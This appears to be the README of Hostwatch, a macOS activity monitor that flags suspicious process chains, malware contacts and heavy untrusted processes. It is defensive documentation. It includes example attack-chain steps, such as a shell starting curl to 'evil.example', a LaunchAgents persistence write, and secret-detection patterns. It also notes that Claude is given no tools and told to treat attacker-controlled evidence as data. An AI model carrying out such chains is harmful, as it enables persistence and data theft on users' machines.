**Review and edit the evidence before sending.** Obvious secrets (bearer tokens, `--password=`,
URL credentials, `ghp_`, `sk-`, `AKIA…` keys) are masked automatically. **Ask Claude** (⌘↩) then runs
Claude Code headless and streams the answer, showing a **SAFE / SUSPICIOUS / DANGEROUS / UNKNOWN** badge:

```
claude -p --output-format stream-json --include-partial-messages --no-session-persistence \
       --setting-sources "" --strict-mcp-config --tools "" --system-prompt "<analyst prompt>"
```

- Uses your existing Claude Code login. No extra API key is needed.
- Your hooks, plugins and MCP servers are skipped, and no session is saved.
- The evidence may be attacker-controlled, so by default Claude gets **no tools** and is told to
  treat the evidence only as data. **Let Claude read local files** is opt-in (`Read`/`Grep`/`Glob`, read-only).
- `claude` is looked up in `~/.local/bin`, `~/.claude/local`, Homebrew and `/usr/local/bin`, then your
  login shell. Set `CLAUDE_PATH` to override.
- Evidence you send goes to Anthropic. A typical question takes about 10 s and costs about $0.02–0.05.

## Baseline: learning this Mac's normal behaviour

On the first launch Hostwatch learns in **three waves, at 5, 15 and 60 minutes**. Each wave sorts the New
patterns seen so far (`BaselinePolicy`):

- **Trusted** (Safe, source "baseline"): normal risk, the acting program (and for a launch the launched one)
  signed by Apple or by the developer of an installed app, valid signature, not quarantined, not in Downloads /
  temp / Shared / a volume, and not touching a sensitive place (login items, credentials, mail, messages).
  macOS system services (daemons and agents on the sealed system volume, not command-line tools like `cat`,
  `sqlite3` or a shell) may touch sensitive places: indexing, sync and malware scanning is their job.
- **On-device model** (never Claude): signed, but the developer isn't trusted yet. Its verdicts are
  suggestions in Needs You; it never suggests Safe for high risk.
- **Needs You** (stays New): high risk, unsigned or ad-hoc, quarantined, Downloads or temp, sensitive
  places, or the program is gone. Malware already on the Mac lands here, so the baseline can't be poisoned.
- Hostwatch's own activity, and interpreters and shells (macOS's own included), are never trusted or listed (they stay New).

**Baseline rules** (Rules tab) are narrow: **one per app and its signer** (*Slack · Slack Technologies*; the
app's helpers included, and the signer must match), and one **macOS system** rule. A rule keeps trusting that app's **future** normal-risk patterns (checked
every 30 s, always through the same policy). After learning, a new app isn't added by itself:
**Update Baseline** (local, code signatures only, no AI) sorts New patterns again and adds rules for trusted
apps among them.

- **Pause** a rule: its patterns go back to New and it stops applying (kept, so Update Baseline won't recreate
  it). **Delete** does the same and removes it; *⋯ ▸ Remove All Baseline Rules* removes every baseline rule.
- **Decided isn't forever.** A Safe pattern, whoever decided it (you included), is **reopened**, back to New and
  listed first in Needs You as *Reopened: …*, when:
  - one of its steps is part of a story that fires (*part of a story: Slack → sh → curl*);
  - its program contacts known malware infrastructure or is a known malware file (every Safe pattern of that
    program);
  - it becomes high-risk: the binary was swapped or modified, is quarantined or runs from a download/temp folder.

  A reopened pattern is never decided again by a baseline rule, a learned rule, *Accept AI suggestions without
  asking* or *Classify with AI*; your own decision (Mark, Trust, Accept) closes it. Decided By shows *Reopened*.
  New kinds of behaviour from a trusted app reach you through its rule's profile (above).
- **Low weight:** your markings and learned rules win over baseline rules, and stories ignore baseline
  trust (they count only your decisions and learned rules), so a chain still alerts.
- **Needs You** has one row per app with all its reasons (for example *signed by Zoom (trusted developer, no
  rule yet)* for an app installed after learning):
  - **Trust** marks its patterns Safe (your decision). For a signed app it also adds a baseline rule marked
    *Trusted by you*, which also covers that app's own sensitive places (never high-risk, unsigned or
    downloaded). Unsigned or ad-hoc programs are trusted pattern by pattern, with no rule.
  - Interpreters and shells (python, node, ruby, bash, osascript…) aren't listed: they run any script they're
    given, so trusting them would trust a virus's script too. Their patterns stay New, visible in Patterns,
    and stories keep watching them.
  - **Dismiss** hides the row; its patterns stay New and aren't listed again.
  - Click *N patterns ›* to list them in the row. *⋯* ▸ **Mark Suspicious**, or **Show in Patterns**, which
    opens exactly those patterns (a removable chip replaces the Show filter).
- Existing installs don't start learning by themselves: **Update Baseline** (Rules tab or Settings ▸ Detection).
- **Fewer decisions for you:**
  - **macOS itself is always trusted:** Apple tools on the sealed system volume (also when a trusted app starts
    them: Cursor running `/bin/rm`) fall under the one *macOS system* rule, made by itself, from the first minute.
  - **New apps from developers you trust get a rule by themselves** (*Settings ▸ Detection ▸ Trust new apps from
    developers you trust*, on), marked *Automatic*. A rule you delete isn't made again by itself (Update Baseline
    still can).
  - **A rule trusts only what its app normally does:** in its first week it learns the app's kinds of behaviour
    (`launches node`, `connects to the web`, `reads ~/Documents`, `writes its own data`…); after that a pattern of a
    new kind isn't trusted and comes to Needs You as *new for Slack: writes ~/Movies*. Rules from before this keep
    what they already trusted as their profile. macOS's own rule doesn't learn a profile.
  - **Needs You lists only what's active:** a pattern not seen for 7 days leaves it (it stays New in Patterns
    and comes back if it happens again). **Homebrew tools share one row.**
  - Rules ▸ Rules shows *Trusted automatically in the last 24 hours: N new patterns (Docker 12, …)* with Show.
- Baselines from the first version (one rule per developer) are undone once and sorted again.

## Heavy processes

Processes Hostwatch **saw start** that are still running and using a lot stand out in Events (apps that were
already running when it started aren't followed, or Xcode and browsers would be flagged all day):
- **Heavy** means sustained: CPU averaged over 30 s (at least 25 s of samples) at or above the limit (default
  50% of one core), or a memory footprint at or above the limit (default 1 GB). *Settings ▸ Detection ▸ Heavy
  processes* sets both, or turns it off.
- The launch row gets a live badge (`🔥 380% CPU · 2.1 GB · 12 min`, or a memory chip when memory is the
  reason) and a flame in Status; the HUD shows `🔥 380%`. When the process exits, the badge turns grey
  (`ended 1 min ago · peak 240% · 900 MB`) for 10 minutes.
- A banner above the list names the heavy ones: app icon, name (with an *Untrusted* tag when it is), the
  program that started it, a CPU gauge (400% fills it), memory and running time; ✦ asks AI and ⋯ has Show in
  Finder and Copy Path. **Only These** filters Events to them; the chevron collapses it to one line (the
  busiest names), so it never hides that something is there.
- **Time Travel uses the same design:** the heavy list is recorded with each 5-second metrics sample (usually
  0–3 entries), so at the playhead the banner reads *Running heavy at 14:32:05* and the launch rows carry the
  same badges as they did live (the running time is computed for that moment).
- **Detection:** a heavy process that is unsigned, ad-hoc, quarantined or from a download/temp folder adds the
  story stage *Heavy untrusted process* (3 points, strong): the cryptominer pattern.
- **How:** every 5 s the collector's existing sampler (libproc `proc_pid_rusage`, already used for the busiest
  processes) also sends every process above a floor (≥ 5% CPU or ≥ 300 MB, at most 50) with its start time;
  launch events carry the start time too (`pstart`), so a reused pid is never mistaken for the process that
  started. Exits are checked with `kill(pid, 0)`. Launches restored from history after a restart are followed
  too. Nothing new is recorded; only numbers.

## Story window

**Double-click a story** (or **Show Chain**) to see the whole chain, event by event, on a vertical timeline:
- each step with its time, stage (coloured for strong stages), one sentence ("sh started curl", "curl connected
  to evil.example:443", "sh wrote ~/Library/LaunchAgents/x.plist"), the command line or address, and why it counts;
- indented by process lineage (a child runs below its parent), with a *Processes in this chain* tree and signers;
- **All activity** adds everything those processes did from a minute before to two minutes after the story (from
  history, or what's still in memory when history is off), dimmed between the suspicious steps;
- double-click or right-click a step to ask AI about it, show it in the timeline, or copy it; *Ask AI About This
  Story*, *Show in Timeline*, *Dismiss* and *Always Ignore This Chain* at the bottom.

## Window tabs

**Show** (Events and Patterns, also *View ▸ Show*) is a scope bar: **All · New · Important**. New: not
decided yet; Important: Suspicious and Dangerous plus new high-risk (new domains, beacons, raw IPs and known-bad
matches count as both). Each choice shows how many rows it would list in that tab: events on Events (with the
kind toggles, search and *Only These* as they are), patterns on Patterns. It applies to the HUD, Events and Patterns.

Events ⌘1 · Patterns ⌘2 · Rules ⌘3 · Stories ⌘4 · Domains ⌘5, each with its icon and its count as a badge (icons
only when the window is narrow); the event-kind counters appear on Events only. When exploited macOS flaws aren't
fixed yet, a slim banner at the top says so (*Details*, *Software Update*, ✕ until another flaw is listed).

## Known threats and exploited macOS vulnerabilities

Once a day (and *Update Now* in Settings ▸ Detection) Hostwatch downloads public lists and matches them
on this Mac; nothing about the Mac is sent:

| List | What | Key |
|------|------|-----|
| HaGeZi Threat Intelligence (Medium) | ~320k malware, phishing and C2 domains, ~35k IPs | none |
| Feodo Tracker | active botnet command servers | none |
| ThreatFox | C2 domains, IPs (and ports), URLs' hosts and file hashes, with the malware family (last 7 days, kept 180) | free abuse.ch key |
| MalwareBazaar | malware file SHA-256 (last 48 h, kept 180 days) | free abuse.ch key |
| CISA Known Exploited Vulnerabilities | Apple flaws exploited in the wild | none |

- **Every connection** is checked: its hostname and each parent domain (`a.b.evil.com` → `evil.com`), then its
  IP and IP:port. **Every launch of an untrusted program** (unsigned, ad-hoc, quarantined, or from a download or
  temp folder) is hashed (SHA-256, once per file version) and checked against the file lists (with the key).
- **A match** is the story stage *Known malware*: a story and **Dangerous** on its own, even for a pattern you
  marked Safe. The row gets a red `KNOWN BAD` tag (Events, HUD), the domain a red badge and risk score 100 with
  the reason, and the tray a line. After each update the last 30 days of domains (and
  programs already hashed) are checked again (*contacted earlier*).
- **macOS vulnerabilities:** CISA's Apple entries for macOS (or several Apple systems including it) are compared
  with the date of your last macOS update and any update waiting in Software Update (`softwareupdate --list
  --no-scan`). CISA doesn't name fixed versions, so a flaw listed before your last update is *likely fixed*;
  later ones are *fixed by the waiting update* or *not fixed by your last update*. A banner in the window and a list
  (CVE, component, ransomware use, Apple advisory) show them; the tray says when an update fixes exploited flaws.
- The abuse.ch key is kept in the Keychain. Lists are cached in `~/Library/Application Support/Hostwatch/intel`
  (readable only by you, never executable).
- **A download can't become anything but a list.** Lists are only read (never run), over HTTPS, with no cookies
  or cache, and redirects only within the same server. Before a download replaces the previous copy it must be
  text (not a program, archive, document or script: Mach-O, ELF, PE, zip, gzip, PDF, xar and `#!` are
  refused), within a plausible size, and the right shape line by line (≥ 95% valid domains or IPs; the CISA list
  needs ≥ 500 entries). A list that suddenly shrinks by half or grows five-fold is refused too. A refused update
  keeps the previous list and shows why in Settings ▸ Detection.
- **Poisoning can't flag the platforms everything uses:** Apple, Google, Microsoft, GitHub, AWS, Cloudflare,
  Akamai and a few others are never flagged by their own domain (nor by a parent-domain match). A phishing page
  on a shared host is still flagged by its full name (`login-apple.github.io`). A list can only raise alerts:
  it can never make Hostwatch trust anything.

## Reset Hostwatch

**Settings ▸ General ▸ Reset Hostwatch…** starts over as on the first launch. Choose what to erase:

- **Patterns, decisions and baseline:** `~/Library/Application Support/Hostwatch` (patterns, stories, domains,
  your rules, signing facts, MCP token) and the baseline's state.
- **Settings:** HUD, window, detection, AI, exclusions and history options (`local.hostwatch.app` defaults).
- **Event history and logs:** `~/Library/Logs/Hostwatch`, and in a custom history folder only Hostwatch's
  `activity-*` and `metrics-*` files.

Hostwatch stops the collector, removes the settings, exits, and a small helper deletes the files once the app
has quit (so nothing is saved back) and opens it again. Full Disk Access stays granted.

## After a restart

The event list starts with the newest recorded events from history (up to its 5,000-event limit), so it isn't
empty; the footer shows how many came from before the restart. They are display only (detection already saw
them) and sort below every new event. Time Travel shows the rest.

## Time Travel

*Time Travel* in the activity window's toolbar (or *View ▸ Time Travel*, ⌥⌘T) switches the Events tab
from the live stream to recorded history. Live collection carries on in the background.

- **Timeline** (floating, at the bottom): bars show how busy the Mac was across the whole recording
  (square-root scale, so one burst doesn't flatten the rest; gaps are when nothing was recorded). Red
  and orange dots mark stories, purple dots new domains. Hover for the time, drag to move; clicking
  near a dot lands on it.
- **The slice:** the list shows the window ending at the playhead (1 min, 5 min, 15 min or 1 hour), newest
  first, with the same Show filter, kind toggles, exclusions and search as live. A very busy slice shows
  its newest ~20,000 events and says so.
- **Moving:** ⌘[ and ⌘] (or ◀︎ ▶︎) step one window; ▶︎ plays forward at 1× (real time), 10×, 60× or 600×; the date
  picker jumps anywhere. **Return to Live** (Esc) goes back.
- **From a story:** *Show in Timeline* opens the slice around it.
- **How it reads history:** in the plain (current) file lines are in time order, so the offset of any
  moment is a binary search away; compressed files are found through their block index, and bar
  heights come from byte counts (per-minute counts for compressed files). Nothing is loaded except the slice
  you look at (≈0.2 s for the overview of 14 hours / 1.3 GB, ≈0.1 s per 5-minute slice).
  `Hostwatch --time-travel-probe [dir]` prints these timings.

## Resource use (CPU, memory, network, disk)

Every 5 seconds Hostwatch records system-wide resource use. The Events tab's footer shows it live with
5-minute sparklines: **CPU** (share of all cores), **Mem** (apps + wired + compressed, the same as Activity
Monitor's "Memory Used"; the line turns orange or red with macOS memory pressure), **network**
download ↓ / upload ↑ (Wi-Fi, Ethernet, cellular; VPN tunnels and loopback aren't double-counted) and
**disk** read/write. The list button shows the **busiest processes** at that moment (CPU % of one core,
memory footprint, disk throughput).

- **Sources:** CPU, memory and network come from the kernel's counters (no special rights). The busiest
  processes and disk throughput come from the collector: as root it can see every user's processes
  (`proc_pid_rusage`), which the app can't (about a third of processes, all of them system ones). It sends
  them every 5 s only to the live window, never into the event history.
- **Recording:** one line per sample in `History/metrics-YYYYMMDD.jsonl` (a few MB per day); past days are
  gzip-compressed, and days older than the oldest activity history are deleted with it. *Clear History*
  removes them too. Resource use is recorded while Hostwatch is open.
- **Time Travel:** the timeline shows CPU (blue) and memory (green) lines under the activity bars, on the
  same time axis. The footer strip shows the slice around the playhead, and the banner shows the values
  and the busiest process at the playhead. Times before this feature existed simply have no line.
- `Hostwatch --metrics-probe` prints three readings, for comparing with Activity Monitor or `top`.

## Updates

*Hostwatch ▸ Check for Updates…* asks `api.github.com/repos/everythings-gonna-be-alright/Hostwatch/releases/latest`
for the newest published release (drafts and pre-releases are ignored) and compares its version numerically
with this app's (`0.10.0` is newer than `0.9.2`). If it's newer, an alert shows the version, date and notes
with **Open Release Page**; otherwise it says you're up to date, or why it couldn't check (offline, GitHub
rate limit). With *Check for updates automatically* (Settings ▸ General, on by default) the same check runs
once a day, silently: a newer release appears at the top of the menu bar icon menu and in Settings. The
request is anonymous (a `Hostwatch/<version>` user agent); nothing is downloaded or installed by itself.

## Activity history

All activity is written to disk as JSON Lines, one event per line, with a full `ts` timestamp:

```
~/Library/Logs/Hostwatch/History/activity-20261031-202536-385.jsonl
{"kind":"net","time":"20:25:36","pid":812,"ppid":1,"name":"curl","proc":"/usr/bin/curl","target":"140.82.112.3:443","extra":"TCP","ts":"2026-10-31T20:25:36.385+02:00"}
```

- **Compression:** the file being written stays plain, so appends are cheap and a crash loses nothing.
  When it is full (see Max size below), it is compressed in the background (≈1 s per 100 MB) into
  `activity-….jsonl.gz` plus a small index `activity-….jsonl.idx`. Plain files left from older versions
  are compressed on the next start. Activity logs are very repetitive: on real history, 250 MB became
  ≈10 MB (≈24×).
  - The `.gz` is a series of independent gzip members of ≈4 MB of whole lines, so it is a normal gzip
    file (`zcat`, `zgrep`, `gzip -d` work).
  - The index records each block's earliest and latest timestamp, offset and sizes, plus bytes per
    minute. Time Travel and the MCP server decompress only the blocks a time range needs, and the
    timeline's bars come from the per-minute counts (exact, with real gaps).
  - Compression is crash-safe: the index is written first, then the `.gz`, and only then is the plain
    file removed. A `.gz` without an index is ignored, and the plain file stays authoritative.
- **Max size** (default **5 GB**) caps the bytes on disk of all history files (compressed files count
  compressed, so the cap holds roughly 10–20× more history than before). Files rotate at about 1/20 of
  the cap (1–100 MB of plain text each; 100 MB with the default cap). The oldest files are deleted so the total never goes over.
- The recorder has its own connection with the 40/s display cap turned off. It keeps recording
  while the overlay is paused or a kind is hidden.
- **Apply exclusions to history** is off by default, so everything is recorded. Turn it on to record
  only what passes your exclusions.
- *Settings ▸ History*: on/off, maximum size (500 MB … 50 GB or Custom…), location, Show in Finder,
  Clear History…. The activity window footer shows current usage.
- Query examples:
  ```bash
  cd ~/Library/Logs/Hostwatch/History
  zcat -f activity-*.jsonl* 2>/dev/null | jq -c 'select(.kind=="net")' | tail
  zgrep -h '"name":"curl"' activity-*.jsonl.gz; grep -h '"name":"curl"' activity-*.jsonl
  ```
- Tools: `--story-replay` and `--signature-report` accept a `.jsonl`, a `.jsonl.gz` or the whole
  history folder; `--compress-history <folder>` compresses plain files by hand; `--time-travel-probe`
  prints read timings.

## How the collector works

The collector is built into the app (`Hostwatch --collector`, Swift; until 0.5 it was a Python
script). The launcher starts it as root, and it combines:

- `eslogger exec exit open` (Endpoint Security) → processes and file opens (`exit` is only used to
  keep the list of Hostwatch's own processes exact; it is never published).
  Opens are deduplicated per (pid, path) for 2 minutes and capped at 40/s per client.
- Packet capture (`tcpdump -i pktap,all -k NPD -Z nobody`, read-only; it drops root right after opening
  the capture device, so packets are decoded without root) → every outgoing TCP connection, from
  its SYN packet, with the owning process. This catches connections too short for any polling,
  like `curl google.com`. Endpoint Security has no connect event.
- `lsof -i` snapshot diff every second → UDP flows, incoming connections, and a fallback if packet
  metadata is unavailable. Each connection is reported once, by whichever source sees it first.
- `nettop` traffic statistics (backstop) → a new process with TCP traffic that neither source
  reported within ~1.5 s gets an **inferred** connection event. This matters with security tools
  that take over TCP flows in the kernel (e.g. a traffic-scanning network extension): their short
  connections never appear as packets from the process and close before the next `lsof` poll.
  The destination comes from the process's command line, resolved through the DNS answers just
  seen (`curl google.ua` → `TCP google.ua:80 [142.251.110.94:80]`). It shows as `≈name` when only
  the command line names it, or "closed too fast to read" when nothing does. The Activity list
  marks these as inferred, with byte counts.
- Passive DNS answers (`tcpdump`, port 53, read-only) → a hostname for each new connection: the
  name that resolved to its IP, e.g. `curl TCP www.google.com:80`, kept even behind CNAMEs. If no
  answer was seen (cached before the collector started, or encrypted DNS/DoH), reverse DNS is used
  instead, shown as `~name` (often a provider name like `~bt-in-f100.1e100.net`). The Activity list
  still shows the IP, Claude gets both, and exclusions match hostnames: `net:*.google.com:*`.

**Hostwatch's own activity is not reported** (live, in history or in stories): the app that started the
collector (verified by pid), the collector's own helpers (eslogger, tcpdump, lsof, nettop) and the children
of these. Other runs of the Hostwatch program, such as the MCP server Claude Code starts, are reported like
any program: hiding "anything running the Hostwatch binary" would let malware hide by starting it with
injected code. A pid leaves the list when its process exits, so a reused pid is watched again.

Options: `./scripts/run-agent.sh --no-files --no-net --net-interval 0.5 --socket /var/run/hostwatch/collector.sock`.
Started by hand, the collector accepts connections only from the user who ran `sudo`. For development,
`HOSTWATCH_SOCKET` points the app at another socket path (then its folder need not be root-owned).

The HUD sends its exclusions and enabled kinds to the agent, which filters
per client before sending, so exclusions also reduce load.

## Exclusions

One pattern per line, case-insensitive, `#` for comments. A pattern with `*` or `?`
is a glob that must match the whole value; anything else is a substring match.

```
mdworker              # hide everything from matching processes (name or path)
proc:/usr/libexec/*   # hide spawns of matching executables
net:*:53              # hide connections to matching remote host:port
net:17.*              # hide connections to Apple's 17.0.0.0/8 range
file:/System/*        # hide opens of matching file paths
file:*.plist
```

Sensible noise defaults (`/System`, `/usr/lib`, caches, loopback, Spotlight) are
preloaded; **Restore Defaults** in the editor brings them back. Exclusions persist
in `UserDefaults` (`local.Hostwatch.app`).

## Prototype notes

Apple documents `eslogger` as a tool for exploring and prototyping, not an application API:
its JSON may change without notice. For a distributable tool, replace the collector
with a native Endpoint Security system extension (`com.apple.developer.endpoint-security.client`
entitlement) and a Network Extension for connections.

## Requirements

- macOS 26 or later (Liquid Glass UI; `eslogger` is included)
- Xcode 26 Command Line Tools (Swift 6.2+, macOS 26 SDK)
- Full Disk Access for Hostwatch.app (or Terminal, when using run-agent.sh)
- Administrator password for the collector

Install tools if needed:

```bash
xcode-select --install
```

## Build & run

```bash
./scripts/build-app.sh
open dist/Hostwatch.app      # prompts for an admin password to start the collector
```

## Test

```bash
./scripts/test.sh
```

Runs every automated test (about 10 s):

- **Swift** (`tests/swift`, Swift Testing, `swift test`): pattern grouping and risk rules; Stories
  (attack chains must fire as Dangerous, everyday dev work and known false positives must stay
  quiet); code signing on real unsigned / ad-hoc / quarantined / replaced binaries made in a temp
  folder; new-domain baseline and badges; beaconing maths and rules, raw-IP rules, Homebrew tools
  not trusted by signature (on a real Homebrew binary when one is installed). Tests use in-memory engines and a scratch signing
  database, so they never touch your data.
- **Collector** (`tests/swift/AgentTests.swift`): DNS answers, pktap SYN and `nettop` parsing with real
  lines captured on a Mac, destination inference, secret masking, exclusions, JSON output identical to
  the former Python collector, busiest processes, Hostwatch's own activity, the socket's permissions and
  peer checks, and that helpers get a pipe as stdin and no inherited files.

**Local MRs are gated:** `scripts/hooks/pre-merge-commit` runs the tests on the merged result and
refuses the merge commit if anything fails. It is enabled with `git config core.hooksPath
scripts/hooks` (already set in this repo; run it again after a fresh clone). Emergency bypass:
`git merge --no-verify`.

Manual check with the collector running:

```bash
/usr/bin/id                          # ▶ process
curl -sI https://example.com >/dev/null   # ▶ process + 🌐 connection
cat ~/.zshrc >/dev/null              # 📄 file
```

## Security notes

- **Hardened runtime.** The app is signed with `--options runtime` (ad-hoc builds too; `build-app.sh`
  refuses to finish without it). macOS then ignores `DYLD_INSERT_LIBRARIES` and similar variables and
  loads only Apple-signed libraries into Hostwatch, so code can't be injected into the app, the root
  collector or the MCP server (verified: a test library injected into a build without the flag ran, with
  the flag it doesn't).
- **Collector channel.** The collector serves a Unix socket, `/var/run/hostwatch/collector.sock`, never a
  network port:
  - The folder is created by root with mode 0755, and the collector refuses a folder it doesn't own, so no
    other process can create or replace the socket. A leftover socket is replaced; any other file is not.
  - The socket belongs to the client user with mode 0600 (other users cannot connect).
  - Every connection is checked with the kernel's peer credentials (`LOCAL_PEERPID`, `LOCAL_PEERCRED`):
    when launched by the app, only that app process (and user) is accepted; started by hand, only the
    `sudo` user. Rejections are logged with the process path.
  - The app connects only when the socket is a socket owned by you, mode 0600, in a root-owned folder
    that nobody else can write (and not a link). Otherwise it refuses and the HUD says why, so a fake
    collector run by an ordinary user cannot feed it data.
- New-process events carry the **command line**, which is forwarded to the app, shown, given to
  Claude and **written to history**. Secrets are masked first (`Secrets`, one rule set): Authorization
  and API-key headers and cookies, `name=value` / `--name value` for password, token, secret, API/access/
  private key, auth, session and signature (`GITHUB_TOKEN=`, `?token=`, `--password` too), URL credentials
  (`user:pass@`, `token@`), `curl -u`, `security … -w`, `sshpass -p`, `mysql -p…`, known token formats
  (`ghp_`, `github_pat_`, `glpat-`, `xox…`, `sk-`, `AKIA`/`ASIA`, `AIza`, `npm_`, `hf_`), JWTs and private
  key blocks. History shows `***`; AI prompts `[REDACTED]`.
- **Nothing unmasked goes to an AI:** every prompt (Ask AI, pattern suggestions, rule proposals, domain
  details, on-device or Claude) is masked again right before it's sent, whatever built it. MCP output too.
- **Older history is masked too:** once, in the background, finished history files are re-masked (compressed
  ones rewritten with a new index), and every file is masked again before it's compressed. A secret in a
  shape no rule knows can still slip through. Environment variables are never forwarded.
- To find connections, the collector runs `tcpdump` (DNS answers and TCP SYN headers only, no
  payloads) and `nettop` as root, read-only. Nothing is captured to disk.
- `eslogger` is a notify-only observer. It cannot deny execution.
- Config lines sent by clients are only used as filters; the agent runs no commands based on them.
- The HUD itself runs as the logged-in user; only the collector is elevated.
- The bundled agent script is run as root from the app bundle. Keep the app somewhere only
  you can write to (e.g. `/Applications`), or anything that can modify it gains root on next start.
- The shutdown command additionally needs the per-launch token from `collector.token` (mode 0600).

## Known limitations

- Very short TCP connections are caught by packet capture, or by the `nettop` backstop when a
  security product hides them from capture. Backstop events arrive ~2 s late, and their
  destination is inferred from the command line, so it can be unknown. Short UDP flows, listening
  sockets and unconnected UDP sockets can still be missed.
- File opens are high volume. The rate cap drops excess file events, so add
  exclusions for noisy apps.
- The `eslogger` JSON parser is defensive but may need updates across macOS releases.

## Production architecture

For production, implement a signed Endpoint Security system extension and use
XPC or a protected local IPC channel to communicate with this HUD. The system
extension should subscribe only to the event types required, process callbacks
quickly, and avoid blocking ES callbacks on UI or disk I/O. Apple's ES entitlement
must be approved for the developer team. Do not disable SIP as a routine
installation workaround.
